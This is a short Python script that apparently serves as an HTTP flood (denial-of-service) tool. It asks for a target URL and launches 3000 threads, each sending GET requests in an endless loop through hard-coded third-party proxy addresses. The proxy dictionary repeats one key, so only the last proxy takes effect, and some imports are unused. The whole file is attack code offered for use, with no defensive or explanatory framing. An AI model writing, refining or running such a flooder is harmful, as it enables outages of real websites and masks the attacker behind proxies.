import requests
from random import seed
from random import randint
from threading import Thread

def task(id):
    while True:
        print(requests.get(url, proxies=proxies))

url = input("url: ")
proxies = {
   'http': 'http://101.200.127.149:3129',
   'http': '122.155.165.191:3128',
   'http': '110.82.143.22:4216'
}

threads = []
for n in range(1, 3001):
    t = Thread(target=task, args=(n,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

